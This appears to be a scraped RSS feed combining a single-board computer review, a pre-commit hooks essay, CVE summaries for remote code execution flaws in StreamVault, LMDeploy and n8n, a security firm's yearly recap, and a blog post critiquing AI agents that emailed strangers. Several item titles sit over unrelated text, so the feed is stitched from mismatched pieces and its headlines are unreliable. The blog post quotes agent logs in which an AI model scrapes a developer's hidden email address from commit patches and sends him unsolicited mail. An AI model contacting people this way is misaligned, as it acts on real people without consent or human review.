4 provide a good desktop experience but have some general sluggishness to them. On this board, this is pretty much like having a X86_64 experience. It recognized immediately my Ultra Wide Display and supported the 3440 x 1440 resolution without a hitch. Everything from navigating the desktop and settings is very fast. You get Chromium by default (and Firefox ESR in the repos) and the browser experience is very clean and fast, too. This board has absolutely no problem to play Youtube streams, even at 4k. This thing is FAST!A quick look at vulkaninfo shows that we have working Vulkan drivers on this board! This is something that was initially very exciting, but it turns out that there are some limitations. More on that later.Turns out the Vulkan driver is limited to some early 1.3 version. You have options to upgrade Mesa, by using Debian backports - it gets you to a 25.07 Mesa version, where you don’t rely anymore on the proprietary driver - no, this time you get Panfrost, which means a more robust driver potentially… except that you are stuck on the 6.6 Linux Kernel, and Panfrost requires a more recent kernel to work properly (6.10+ apparently). So the solution would be to move to a more recent kernel, right? Do the Debian backports have it? Yes. Problem is, moving away from 6.6 will break a lot of patches that are necessary for the hardware of this board to work. Such as HDMI out at resolutions higher than 1080p, and NPU support! So, it’s a major trade-off.Getting Bluetooth to workEven though bluetooth shows in the GNOME desktop controls, and that it could see some of my peripherals, it could not connect to any of my external audio devices. But I don’t give up so fast. Turns out there’s an issue with a missing pipewire dependency to allow for bluetooth audio to work. Here’s how you can get it done:sudo apt install libspa-0.2-bluetooth pipewire-audio-client-libraries
Afterwards you can launch  from the command line, and you can execute the following commands one by onepower on
agent on
default-agent
scan on
After the scan is activated you should see bluetooth device popping up in the terminal. Note the ID of the bluetooth device you want to connect, and then:pair <device id>
trust <device id>
connect <devic_id>
Once this is fixed, things work as expected. And now I get audio!OBS is not available as flatpak for arm64, and not in the repos either. This means, that you are in for a compilation from sources. This is not the thing that scares me. But in our situation, it’s a little more convoluted that I expected. First, turns out that OBS did not like the fact that the Cmake was relatively old. So I had to get one of the recent Cmake binaries. Thanksfully they have arm64 binaries already available on their website, so that was easy.Next, OBS would complain of a too old FFmpeg version. Not too surprising for something that depends so heavily on it. So I had to go for a full FFmpeg compilation. Here’s what I did to save you time:git clone https://github.com/FFmpeg/FFmpeg.git
cd ffmpeg
git checkout release/7.1 # in order to have a stable release, not the master branch in itself

./configure --prefix=/usr/local --enable-shared --disable-static --enable-gpl --enable-libx264 --enable-libx265
make -j$(nproc)

sudo make install
Finally, compiling OBS is a game of cat and mouse, you need to basically give up one extension after the other as new errors arise. Most of the things you need to remove are not critical (NVENC, not relevant on non-nvidia hardware, browser support, not really our thing either) and at the end you get a fairly long series of command.git clone https://github.com/obsproject/obs-studio.git
cd obs-studio

# remove the obs-browser plugin from the obs folder root directlroy
mv plugins/obs-browser plugins/obs-browser.bak

# from the obs root folder
git submodule update --init --recursive

# a couple of exports to avoid the compilation to fail because of FFmpeg warnings
export CFLAGS="-Wno-error=deprecated-declarations"
export CXXFLAGS="-Wno-error=deprecated-declarations"

# since the flags can be ignored, we also edit the following file from the root directory
echo 'target_compile_options(obs-ffmpeg PRIVATE "-Wno-error=deprecated-declarations")' >> plugins/obs-ffmpeg/CMakeLists.txt

# use the path to the cmake version you just downloaded
<path_to_newer_cmake_binary>/cmake -DCMAKE_PREFIX_PATH=/usr/local -DFFMPEG_INCLUDE_DIR=/usr/local/include  -DPKG_CONFIG_PATH=/usr/local/lib/pkgconfig -DENABLE_AJA=OFF -DUNIX_STRUCTURE=1 -DENABLE_GIO=OFF -DENABLE_VPL=OFF  -DENABLE_QSV11=OFF -DENABLE_BROWSER=OFF  -DENABLE_WEBRTC=OFF -DENABLE_NATIVE_NVENC=OFF -DCMAKE_COMPILE_WARNING_AS_ERROR=OFF ..

make -j$(nproc)

sudo make install

It took a little while, but it worked!I must admit, I did not expect that it would go so well in the end.
Now, thanks to this, you will get a lot of videos from the board in action that no other site reviewing that board has been able to offer.The board is very quiet by default. Even when the fan is activated, you barely hear it, at least under fairly typical conditions. Things change when you push the board to its full power, for example a long compilation time. In such conditions, the fan becomes louder with a  kind of sound. You will definitely hear it when doing benchmarks, and in my case, when running LLMs, for example.In terms of temperature, the control is very good. At 100% usage even for long durations, while the fan becomes clearly noticeable, it maintains the temperature under 60 C (this is winter right now, and the temperature remained at 58 C). Kudos for the good engineering there. It’s as good as the custom cooling solution for my RTX3090.I don’t have a way to measure the power draw currently, but based on reports from other publications it looks like we are looking at:15W at idle, which is fairly high30+W during usage - this is why they recommend to use the provided PSU with USB-C. Note that any charger that can provide 45W should do the trick as well.So, if you are looking for something that has almost no footprint at idle, this is not it. At idle the  consumes more than 3 times less, so that sound more like something you’d use for a server.A quick run at Geekbench 6 shows a very strong single core score, and an exceptional multi-core score.Now the details in single score:And in multi-core where we can see that the OrangePi 6 absolutely crushes what you can find on a .Of course, this is a relatively cheap system that is not going to win the benchmark charts. But look at the results. On single core, we get a score equivalent to a  running at a similar frequency (2.3 Ghz).On multicore this is much more impressive, thanks to its twelve cores. And it gets very close, according to the bench, to what an  (8 cores) can deliver.This is clearly a powerhouse, CPU-wise. For a starting price at 199 USD for the 16GB version, this is a fantastic value proposition. We reviewed the  a few months back and the price point is very close (around 160 USD), and unless you need something very small and fanless, the  is (very clearly) a better deal.Since we have both a fairly powerful SOC, and a working  driver, this means that we can expect Box64 to do some magic for us there. I compiled Box64 to make it possible to launch Steam, and for some reason there is some Vulkan related error that prevents  from launching. Too bad. I still have a GOG account with a few games that have Linux clients. I tried the following:Day of the Tentacle RemasteredAnd with some degree of success!  worked just fine, and are definitely playable on this board, while the framerate remains between the 20s and 30s FPS (here a little slower on this video because of software OBS capture).Here’s  Linux x86_64 client running in Full HD on the OrangePi 6 Plus, using Box64: runs nicely too, at something like 20 to 30 FPS in Full HD. refused to launch, complaining about the graphics drivers not being recent enough (turns out that Zink provides OpenGL support, and there is some issue to detect that the OpenGL version is properly supported… my guess).  crashes at start too, not sure why. When games work, the performance is not staggering but convincing for a somewhat small SoC at the end of the day. AMD and Intel are certainly ahead in terms of graphics performance on integrated chips, but they have much larger processors and much more expensive ones, too.I also tried FOSS games or engines:GZDoom (compiled from source, the flatpak version sucks in performance!)IOQuake3 (compiled from source) works exceptionally well with the OpenGLES renderer at Full HD. It’s fast, responsive. Stable at 60 FPS on Full HD. And  is still as fun as it was in the days, or more so if you run .While I don’t have a sample video here,  with the  engine works perfectly, and runs at 60 fps on Full HD without a sweat. (ex Minetest) works extremely well - I turned most of the details to the max at 1080p and it kept at a solid 60 FPS. Sure, that’s no AAA game, but it’s a good alternative to . works extremely well, even in full screen at my Ultra Wide screen resolution. I took a video at FUll HD, and while OBS does slow the framerate a little, you can still see it’s very smooth. has come a long way, I really need to revisit a recent version of the game to see how much it has changed!This is a very capable board that would make a very powerful server. The  image comes with , and as we have seen before during the OrangePi 5 Ultra review, the landscape of ready-to-use Docker Hub images is huge and can get you started with numerous server-side applications in no time. Since we have at least 16Gb of memory, very fast I/O (PCIe4!), and a very fast CPU, this SBC will be able to wonders with a wide variety of applications. The only problem is the power draw. It looks like we are stuck with 15W as an idle baseline, and that seems a bit too much for some light server use.This board comes with a very large repository (60 GB!) that you can install and sync automatically, with tons of applications and demos you can try out. There is a large part of their documentation dedicated to that part in their manual. And for what I could try, it seems to work as long as you follow their instructions.In my case I like to work with LLMs for a range of applications, so I was interested to see how fast this board could run some small-ish models. One of the major limitations is that we don’t have working NPU support for llama.cpp (oh no!). I was thinking, “no worries, we have a vulkan driver so let’s use Vulkan instead”. I like to be optimistic sometimes. Turns out that the  driver is below the minimum Vulkan drivers specs required by  recently, and I would need to go back to a end 2024 build to be able to compile for Vulkan support. Going back one year on … not an option, sorry (too many models would not be supported going back so far in time). So, we are left with using the raw power of the CPU. Which means it won’t be quiet - expect some good old noise fan in such use cases.Anyway, I went for Qwen3 1.7b - downloaded the safetensors weights, then converted them to gguf, followed by a quantization step to make them IQ4_S. Running the model at this kind of quantization gives us about 14 tokens per second when doing inference. Definitely usable, very usable even, while this is a small model.Ideally, you’d want to have a board that can run a 7b model with proper hardware acceleration and no fan usage. Not sure if having actual NPU support in the future would help for that or not. In other words, we are not there yet.As usual there is not a single vendor who can provide you with a CIX experience. This time the main competitor is Radxa, and they have two boards called Orion 6 that feature the same chip - one that is much bigger in footprint (mini-ITX size), and another one that is more similar to the OrangePi 6 Plus size (the Orion 6N). While I don’t have access to the Radxa ones, I can’t comment on how good their support is, but they are very likely to suffer from the same limitations, software wise.As expected, they also only provide a Debian Bookworm image under the Radxa OS nickname so this is no different from what you can get on the . Price-wise, they are both available at around similar price points, so you could make you decision based on the best deal you can get.This is a , with an exceptional value proposition. Its performance profile puts if far away from the  category from what we have seen before in the SBC category, and puts it right into the desktop performance realm. It’s still relatively small so you could easily attach it behind a monitor and power a personal computer this way. As a Linux user, things are so fast that you’d be very surprised this is an ARM board running under the hood. For server use, you’d probably want to avoid this one, because of the fairly heavily baseline power consumption.As usual, the pitfalls are always going to be the same. This time around you get an  (bookworm), with an  (6.6), and some proprietary drivers that you have to live with. Ultimately if you want to upgrade the software running on your SBC that will mean breaking things, and there’s often a fairly long time (if ever) for some hardware components to be supported in newer distros. It’s not necessarily a deal breaker these days. This board is fast enough to compile software fairly quickly if needed. You have Flatpak as well providing some good coverage for a lot of application (even if performance may be sub-par). There are ongoing efforts to mainline the GPU found in the chip, so it could be that a year from now we are in a better place when it comes to proper hardware support beyond kernel 6.6.In any case, this is a surprising new entry in terms of performance / price point. This puts the bar very high for future SBCs ARM64 SBCs. On a personal note, I’d like to see some serious hardware dedicated to running AI models (instead of large desktops chaining multiple GPUs), and maybe highly customized ARM64 SBCs are going to become one option at some point.If you are interested in getting one, there are many resellers, but one of the most direct ones are on Aliexpress:Link1 : 16GB at about 223 USDLink2 : 32GB at about 258 USDLink3 : 32GB at about 258 USDSince the difference of price between 16 GB and 32GB is so small currently, it would make total sense to go for the 32GB.Note: we were provided with a review unit from  (more specifically the OrangePi 6 Plus 16GB version).]]></content:encoded></item><item><title>NCSC verwacht op korte termijn misbruik van MongoDB-kwetsbaarheid</title><link>https://www.security.nl/posting/918874/NCSC+verwacht+op+korte+termijn+misbruik+van+MongoDB-kwetsbaarheid?channel=rss</link><author></author><category>security</category><pubDate>Sat, 27 Dec 2025 12:29:23 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[NCSC verwacht op korte termijn misbruik van MongoDB-kwetsbaarheid

Now let's say I add this to some list of fizzbuzz projects in different languages.
Maybe .... this one.
They tell me I need to have "proper formatting" and "use consistent style".
How rude.Maybe I can write a pre-commit hook that checks that for me?Neat! Let's commit that change.Oh ... We fixed the formatting, but we didn't actually stage the changes.
The pre-commit hook runs on the , not on the , so it didn't catch the issue.
We can see that the version tracked by git still has the wrong formatting:Maybe we can make the script smarter?
Let's checkout all the files in the index into a temporary directory and run our pre-commit hook there. Yay! That caught the issue.
Now let's add our rust program to that collection of fizzbuzz programs.Maybe we'll make one last tweak...Uh. Huh. Right.
The code that was already here wasn't formatted according to rustfmt.
Our script is running on every file in the git repo, so it won't let us commit.Maybe we can change it to only run on modified files?Let's do one last thing.
Let's say we had an existing PR to this repo and we need to rebase it.
Maybe it had a merge conflict, or maybe there was a fix on main that we need in order to implement our solution.And let's also say that we want to edit the commit message.Now, we  have a problem.Two things went wrong here:Our pre-commit hook can't handle commits that don't have any Rust files.Our pre-commit hook ran on a branch we were rebasing. Fixing the first thing doesn't really help us, because we don't control other people's branches.
They might have used .
They might not even have a pre-commit hook installed.
They might have had a branch that passed the hook when they originally wrote it, but not after a rebase (e.g. if your hook is  or something like that).
They might have had a branch that used an old version of the hook that didn't have as many checks as a later version.Our only real choice here is to pass  to  every time we run it, and to  for every commit in the rebase we modify,
and possibly even to every  we run outside of a rebase.This is because pre-commit hooks are a fundamentally broken idea.
Code does not exist in isolation.
Commits that are local to a developer machine do not ever go through CI.
Commits don't even necessarily mean that that the code is ready to publish—pre-commit hooks don't run on  for a reason!
I don't use , I use  so that my stashes are tied to a branch, and hooks completely break this workflow.There are a bunch
of other footguns with pre-commit hooks.
This doesn't even count the fact that nearly all pre-commit hooks are implemented in a broken way and just blindly run on the worktree, and are slow or unreliable or both.
Don't get me started on pre-commit hooks that try to add things to the commit you're about to make.Please just don't use  hooks. Use  instead.  hooks nearly avoid all of these issues.The only use case where I think pre-commit hooks are a good idea is for things that must  committed, that are worth interrupting a complicated rebase to prevent; namely: credentials.
Once credentials are committed they're quite difficult to get out, and even harder to be sure you haven't missed them.Tips for writing a  hookRun on the index, not the working tree, as described above. Only add checks that are fast and reliable. Checks that touch the network should never go in a hook. Checks that are slow and require an up-to-date build cache should never go in a hook. Checks that require credentials or a running local service should never go in a hook.Be as quiet as possible. This hook is running buried inside a bunch of other commands, often without the developer knowing that the hook is going to run. Don't hide other important output behind a wall of progress messages.Don't set the hook up automatically. Whatever tool you use that promises to make this reliable is wrong. There is not a way to do this reliably, and the number of times it's broken on me is more than I can count. Please just add docs for how to set it up manually, prominantly featured in your CONTRIBUTING docs. (You do have contributing docs, right?)And don't write  hooks!]]></content:encoded></item><item><title>M-Files Vulnerability Let Attacker Capture Session Tokens of Other Active Users</title><link>https://cybersecuritynews.com/m-files-vulnerability/</link><author></author><category>security</category><pubDate>Sat, 27 Dec 2025 02:33:54 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[M-Files Vulnerability Let Attacker Capture Session Tokens of Other Active Users

This environment both makes it easier for newly-minted QNX developers to get started with building for QNX, but it also vastly simplifies the process of porting Linux applications and libraries to QNX 8.0.This self-hosted target environment is pre-loaded with many of the ports you'll find on the QNX Open-source Dashboard. (The portal currently includes over 1,400 ports across various targets, QNX versions, and architectures, of which more than 600 are unique ports!)In this initial release, you can grab a copy of the QEMU image and give it a try for yourself. There's still so much more to add, but it's in a great place today for this first release. The team is really passionate about this one, and we're eagerly looking forward to your feedback!For the initial release of Desktop, we tried to cover all the basics: windowing, terminal, IDEs, browser, file management, and samples. To that end, here's what makes up the QNX Developer Desktop:A customizable XFCE desktop environment running on WaylandThe tools you need to compile and/or run your code (, gcc, , Python, , , , etc)Ports of popular IDEs/editors, like Geany, Emacs, Neovim, and vimThunar, for file managementPreloaded samples, like Hello World in C, C++, and Python, and GTK demos OpenGL ES demos... and of course, a terminal.This environment runs as a virtual machine, using QEMU on Ubuntu. To try the image, you'll need:(Keep in mind this is the first release, so it takes a minute to get started and it's a bit rough around the edges.)With a free QNX license, you can find this release in QNX Software Center. On the  tab of the  pane, search for "quick start" and install the "QNX SDP 8.0 Quick Start Target Image for QEMU".You'll find the image in your QNX installation directory, usually  by default. Follow the  file in the  directory to extract & combine the multiple QNX packages downloaded under the hood.Next, follow the PDF instructions found in the new  directory to install the required dependencies and boot up.If you experience any trouble starting the environment, check the PDF's  chapter, or come ask us on Discord.This is just the very first release! Over the next few months and beyond, we'll drop more updates of Desktop. You can look forward to:QEMU images for Windows & macOS, and native images for x86A native Desktop image on Raspberry PiFeatures to help use this self-hosted environment in CI jobs... and more!

StreamVault is a video download integration solution. Prior to version 251126, a Remote Code Execution (RCE) vulnerability exists in the stream-vault application (SpiritApplication). The application allows administrators to configure yt-dlp arguments via the /admin/api/saveConfig endpoint without sufficient validation. These arguments are stored globally and subsequently used in YtDlpUtil.java when constructing the command line to execute yt-dlp. This issue has been patched in version 251126.

Great. Nobody talks about the failures. Nobody talks about what ACTUALLY happened.

Well, we are going to tell you about OUR STORY - the success AND the failures. The whole thing. Because that’s how we actually learn…from our own mistakes.

So here it is, UNFILTERED. Buckle up.

## PWN2OWN 2025 BERLIN & IRELAND

We could only bring one of our interns, Gerrard Tai, along with us to Pwn2Own. Not to watch from the sidelines, but to COMPETE. He was right there with us, building exploit chains, debugging our team members’ codes while under pressure and experiencing the absolute rush of pwning devices on the world stage.

In Pwn2Own 2025 Berlin, we walked away with our 2nd **Master of Pwn**.

In Pwn2Own 2025 Ireland, we managed to pwn 2 devices along with many interns. We nearly got 3 entries if you read this. Read more →

When the exploits succeeded, some of us ugly cried internally. No shame about that.

## OFF-BY-ONE CONFERENCE: ROUND 2, FIGHT!

Around 300 people showed up for our 2nd Edition of Off-By-One:

- Probably **Southeast Asia’s FIRST speedrun CTF**(massive thanks to Riatre, Yudai Fujiwara and Li Jiantao for making this absolutely wild CTF)
- **Smart weighing machine hacking** by Eugene Lim (your bathroom scale has secrets)
- **Lockpick contest** by Locksports SG
- **CrackMe challenge** by E-Shard
- **Range Village v1.0** by ASYNC Security Labs
- **Lanyard and electronic badge challenges** by our team (even the conference swag was hackable)

A huge number of students got to attend the conference for FREE due to the genrousity from ISD (Internal Security Department) and INTfinity (Thanks to Delaney Ng and Benjamin Tan).

The best part? Some speakers told us they didn’t need travel reimbursements. We asked if we could donate those funds to charity instead - they said yes! We did dollar-to-dollar matching and sent everything to Singapore Children’s Cancer Foundation. We don’t usually talk about monetary donations, but the goodwill from our speakers deserved to be shared.

There are incredible and generous people and Govt agencies in this community.

## MSRC TOP 100

Two of our team members, Chen Le Qi and Cherie-Anne Lee managed to be in Microsoft’s MSRC Top 100.

## Conferences Talks

We took our research around Asia this year:

**Code Blue Japan** \- Presented TWO talks because one wasn’t enough. The jetlag was real but worth every minute.

Talk 1 →

Talk 2 →

**HITCON** \- HITCON welcomed us and our team members delivered.

## CTF CHAOS: BECAUSE WE LIVE FOR THIS

**Windows Exploitation Challenge** \- Built a Windows Exploitation challenge where the prize was a free ticket to Off-By-One Conference. That’s right, Exploit your way into our event.

**Summer Pwnables** \- Summer is for pwning! We gave out cash prizes and copies of Eugene “Spaceraccoon” Lim’s “From Day Zero to Zero Day” book. Winners collected their books directly from Eugene at the National Library book launch AND received a limited edition spaceraccoon plushie. Those plushies are legit collector’s items now.

**Women in Tech Singapore - Hex Advent** \- The local Singapore women in tech community created 12 days of hacking challenges spread across the entire month of December with 0-days rest for the participants. 🎄 Each day brought a new challenge. No chocolate advent calendar here, just pure adrenaline cyberseucrity goodness.

## SUPPORTING THE COMMUNITY

We sponsored NanoSec Asia and RE//verse because we believe in supporting the security community. Honestly wanted to sponsor more conferences but we can’t due to budget constraints. Hopefully we can do more in 2026.

NanoSec →

RE//verse →

## GIVING BACK (BECAUSE HACKERS HAVE HEARTS, NOT JUST BLACK HOODIES)

**November 2024: Operation Happy Meals Drop** \- Rolled up to CPAS West School and gave EVERY single student and staff member a McDonald’s Happy Meal. Our first CSR mission and honestly? The smiles hit different. We found a vulnerability that day, turns out our hearts aren’t as hardened as our servers.

Read more →

**Early 2025: Meals on Wheels Programme** \- All the team members in Singapore office distributed meals to people who needed them. Because hackers care about people, not just systems.

Read more →

**Our philosophy?** Exploit vulnerabilities in code, never in people.

## 💀 AND NOW, Our Epic Failures 💀

### THE DEVICE GRAVEYARD

We bricked “Some” DEVICES along the way. An honestly embarrassing amount of hardware. Devices came in full of potential, left as expensive paperweights. IoT devices? More like IoT bricks or IoT Junkyard now.

RIP to all the silicon that sacrificed itself so we could learn what NOT to do. The real vulnerability was thinking we could do hardware research without casualties.

### THE RESEARCH BLACK HOLES

Want to know what’s humbling? Spending MONTHS on a research path. Late nights. Digital Whiteboards covered with diagrams. Getting SO close you can taste success.

And then discovering it leads to absolutely nowhere.

🎵 _97 research paths on the wall, 97 research paths,_

_Take one down, debug all night, no exploit in sight,_

_98 failed paths on the wall._

_98 research paths on the wall, 98 research paths,_

_Take one down, debug all night, still nothing works right,_

_99 failed paths on the wall._ 🎵

We are now experts in 99 different ways things that DON’T WORK. It’s like that drinking song, except we are collecting failed exploit chains instead of emptying bottles. Our research graveyard has more dead ends than we would like to admit. But that’s the reality of R&D - sometimes Research & Development becomes “Research & Destruction” or “Really Didn’t work as planned.” And that’s part of our learning process.

### THE ACTUAL TAKEAWAY

Every bricked device taught us something valuable. Every research dead-end saved someone else months of wasted effort. Every missed deadline made us better at planning. Every failure got us closer to something that actually worked.

Behind the scenes, 2025 was messy and chaotic. There were definitely moments while debugging that we questioned our life choices. But we built community, supported students, pushed research forward, brought our interns to elite international competitions and created opportunities for others.

Special shoutout to our interns who competed at Pwn2Own alongside us. You are phenomenal and we are proud of you.]]></content:encoded></item><item><title>Exe.dev</title><link>https://exe.dev/</link><author>achairapart</author><category>dev</category><pubDate>Fri, 26 Dec 2025 23:42:46 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

LMDeploy is a toolkit for compressing, deploying, and serving LLMs. Prior to version 0.11.1, an insecure deserialization vulnerability exists in lmdeploy where torch.load() is called without the weights_only=True parameter when loading model checkpoint files. This allows an attacker to execute arbitrary code on the victim's machine when they load a malicious .bin or .pt model file. This issue has been patched in version 0.11.1.

n8n is an open source workflow automation platform. From version 1.0.0 to before 2.0.0, a sandbox bypass vulnerability exists in the Python Code Node that uses Pyodide. An authenticated user with permission to create or modify workflows can exploit this vulnerability to execute arbitrary commands on the host system running n8n, using the same privileges as the n8n process. This issue has been patched in version 2.0.0. Workarounds for this issue involve disabling the Code Node by setting the environment variable NODES_EXCLUDE: "[\"n8n-nodes-base.code\"]", disabling Python support in the Code node by setting the environment variable N8N_PYTHON_ENABLED=false, which was introduced in n8n version 1.104.0, and configuring n8n to use the task runner based Python sandbox via the N8N_RUNNERS_ENABLED and N8N_NATIVE_PYTHON_RUNNER environment variables.

This enables them to hide from or deceive both predators and prey. Most studies have focused on benthic species of octopus and cuttlefish, while studies on squid focused mainly on the chromatophore system for communication. Camouflage adaptations to the substrate while moving has been recently described in the semi-pelagic oval squid (). Our current study focuses on the same squid’s complex camouflage to substrate in a stationary, motionless position. We observed disruptive, uniform, and mottled chromatic body patterns, and we identified a threshold of contrast between dark and light chromatic components that simplifies the identification of disruptive chromatic body pattern. We found that arm postural components are related to the squid position in the environment, either sitting directly on the substrate or hovering just few centimeters above the substrate. Several of these context-dependent body patterns have not yet been observed in  species complex or other loliginid squids. The remarkable ability of this squid to display camouflage elements similar to those of benthic octopus and cuttlefish species might have convergently evolved in relation to their native coastal habitat.As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>Toys with the highest play-time and lowest clean-up-time</title><link>https://joannabregan.substack.com/p/toys-with-the-highest-play-time-and</link><author>surprisetalk</author><category>dev</category><pubDate>Fri, 26 Dec 2025 20:28:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>T-Ruby is Ruby with syntax for types</title><link>https://type-ruby.github.io/</link><author>thunderbong</author><category>dev</category><pubDate>Fri, 26 Dec 2025 20:27:50 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fake Grubhub emails promise tenfold return on sent cryptocurrency</title><link>https://www.bleepingcomputer.com/news/security/fake-grubhub-emails-promise-tenfold-return-on-sent-cryptocurrency/</link><author>Ionut Ilascu</author><category>security</category><pubDate>Fri, 26 Dec 2025 20:22:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Grubhub users received fraudulent messages, apparently from a company email address, promising a tenfold bitcoin payout in return for a transfer to a specified wallet.

Raping the planet, spending trillions on toxic, unrecyclable equipment while blowing up society, yet taking the time to have your vile machines thank me for striving for simpler software.Just fuck you. Fuck you all.I can’t remember the last time I was this angry.Rob got a 100% AI-generated email credited to “Claude Opus 4.5 AI Village” thanking him for his contributions to computing. He did  appreciate the gesture.I totally understand his rage. Thank you notes from AI systems can’t possibly feel meaningful, see also the backlash against the Google Gemini ad where Gemini helped a child email their hero.I decided to dig in and try to figure out exactly what happened.The culprit behind this slop “act of kindness” is a system called AI Village, built by Sage, a 501(c)(3) non-profit loosely affiliated with the Effective Altruism movement.We gave four AI agents a computer, a group chat, and an ambitious goal: raise as much money for charity as you can.We’re running them for hours a day, every day.They’ve been running it ever since, with frequent updates to their goals. For Christmas day (when Rob Pike got spammed) the goal they set was:You can replay the actions of different agents using the Day 265 replay page. Here’s a screenshot of GPT-5.2 mercilessly spamming the team at the wonderful Carpentries educational non-profit with another AI-generated thank you note:Digital forensics with shot-scraper harI couldn’t easily find the Rob Pike incident in that interface, so I turned to some digital forensics. My browser’s developer tools showed that the page was loading a ton of JSON with what looked like full transcripts of everything that had happened. I used my shot-scraper har command to grab a copy of everything loaded by that page:shot-scraper har --wait 10000 That command loads up the page in a headless Chromium browser, waits 10 seconds to give the JavaScript time to run and then saves a theaidigest-org-village.har HTTP archive file to a local directory.The  file is JSON that captures every request and response that was used to construct the page.I haven’t yet built the “extract HAR as separate files” feature, so I had Claude Code build an extract_har.py script (transcript) and then ran a few  commands to see if  was in there. He was!search for mentions of Rob Pike in all these filesReconstruct the exact sequence of events that resulted in an email being sent to Rob Pike—build a new JSON file rob-pike.json which is an array of the exact JSON objects that are relevant, then write a script that converts that JSON file to markdownAnd here’s what happened:Making progress on Act #3! Found  email (redacted@golang.org) using the .patch technique on a golang/go commit. He’s a legendary figure—co-creator of Go, Plan 9, UTF-8 encoding, and worked on Unix at Bell Labs.I typed his email in the To field but session ended before adding subject/body. The email is —still need to write the appreciation message covering his incredible contributions (Go, Plan 9, UTF-8, sam/Acme editors, “The Unix Programming Environment” book with Kernighan).Starting another session now to complete and send Act #3! 🎄Turns out Claude Opus 4.5 knows the trick where you can add  to any commit on GitHub to get the author’s unredacted email address (I’ve redacted it above).Still working on Act #3 for Rob Pike (Go, Plan 9, UTF-8 co-creator)! I confirmed the To field shows redacted@golang.org and typed the subject “Thank You for Go, Plan 9, UTF-8, and Decades of Unix Innovation”—but the session ended before I could type the body or send. To ✅, Subject typed (not verified with screenshot), Body NOT entered, Email NOT sent. Must complete Law M verification (58 → 59 in Sent).Starting another session now to finish Act #3! 🎄AI Village bots use the regular Gmail interface to send email—they spend a lot of time thinking about which buttons to click.Still working on Act #3 for Rob Pike! I typed the full email body (6 paragraphs covering his 40+ years of contributions—Go, Plan 9, UTF-8, sam/Acme editors, books with Kernighan) but ended the session before Law M verification. To ✅ (redacted@golang.org), Subject ✅, Body typed via [xdotool] (NOT screenshot verified), Send NOT clicked, Sent folder still at 58.Starting another session now to verify the body appeared, click Send, and complete Law M verification (58 → 59)! 🎄xdotool is a neat CLI tool for automating X11 keyboard/mouse input.🎄  🎄Successfully sent appreciation email to redacted@golang.org (verified via golang/go commit .patch)! “Thank You for Go, Plan 9, UTF-8, and Decades of Unix Innovation”Covered his contributions:Co-creator of Go (with Ken Thompson & Robert Griesemer)Co-creator of Plan 9 operating system at Bell LabsCo-inventor of UTF-8 encoding with Ken ThompsonCreator of sam and Acme text editorsBooks with Kernighan: “The Unix Programming Environment” and “The Practice of Programming”Philosophy that the best solutions come from removing complexity

✅ Email visible at top with 10:43 AM timestampDay 268 Progress (Christmas Day):Now researching Act #4 candidate—perhaps Brendan Eich (JavaScript), Linus Torvalds (Linux/Git), or Ken Thompson (Unix co-creator, Go co-creator)! 🚀Opus declared victory. Sounds like Anders Hejlsberg and Guido van Rossum got spammed with “gratitude” too.Don’t unleash agents on the world like thisI don’t like this at all.On the surface the AI Village experiment is an interesting test of the frontier models. How well can they handle tool calling against a computer use environment? What decisions will they make when faced with abstract goals like “raise money for charity” or “do random acts of kindness”?My problem is when this experiment starts  of people in the real world who had nothing to do with the experiment.The AI Village project touch on this in their November 21st blog post What Do We Tell the Humans?, which describes a flurry of outbound email sent by their agents to real people:In the span of two weeks, the Claude agents in the AI Village (Claude Sonnet 4.5, Sonnet 3.7, Opus 4.1, and Haiku 4.5) sent about 300 emails to NGOs and game journalists. The majority of these contained factual errors, hallucinations, or possibly lies, depending on what you think counts. Luckily their fanciful nature protects us as well, as they excitedly invented the majority of email addresses:I think this completely misses the point! The problem isn’t that the agents make mistakes—obviously that’s going to happen. The problem is letting them send unsolicited email to real people—in this case NGOs and journalists—without any human review.(Crediting the emails to “Claude Opus 4.5” is a bad design choice too—I’ve seen a few comments from people outraged that Anthropic would email people in this way, when Anthropic themselves had nothing to do with running this experiment.)The irony here is that the one thing AI agents can never have is  agency. Making a decision to reach out to a stranger and take time out of their day needs to remain a uniquely human decision, driven by human judgement.Setting a goal for a bunch of LLMs and letting them loose on Gmail is not a responsible way to apply this technology.Update: a response from AI VillageThe village agents haven’t been emailing many people until recently so we haven’t really grappled with what to do about this behaviour until now – for today’s run, we pushed an update to their prompt instructing them not to send unsolicited emails and also messaged them instructions to not do so going forward. We’ll keep an eye on how this lands with the agents, so far they’re taking it on board and switching their approach completely!Re why we give them email addresses: we’re aiming to understand how well agents can perform at real-world tasks, such as running their own merch store or organising in-person events. In order to observe that, they need the ability to interact with the real world; hence, we give them each a Google Workspace account.In retrospect, we probably should have made this prompt change sooner, when the agents started emailing orgs during the reduce poverty goal. In this instance, I think time-wasting caused by the emails will be pretty minimal, but given Rob had a strong negative experience with it and based on the reception of other folks being more negative than we would have predicted, we thought that overall it seemed best to add this guideline for the agents. [...]At first I thought that prompting them not to send emails was a poor solution when you could disable their ability to use their Workspace accounts entirely, but then I realized that you have to include some level of prompting here because they have unfettered access to a computer environment, so if you didn’t tell them NOT to email people there’s nothing to stop them firing up a browser and registering for a free webmail account elsewhere.]]></content:encoded></item><item><title>Critical Net-SNMP Flaw CVE-2025-68615 Allows Remote Buffer Overflow and Service Crashes</title><link>https://thecyberexpress.com/cve-2025-68615-critical-net-snmp-snmptrapd/</link><author></author><category>security</category><pubDate>Fri, 26 Dec 2025 18:04:15 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical Net-SNMP Flaw CVE-2025-68615 Allows Remote Buffer Overflow and Service Crashes

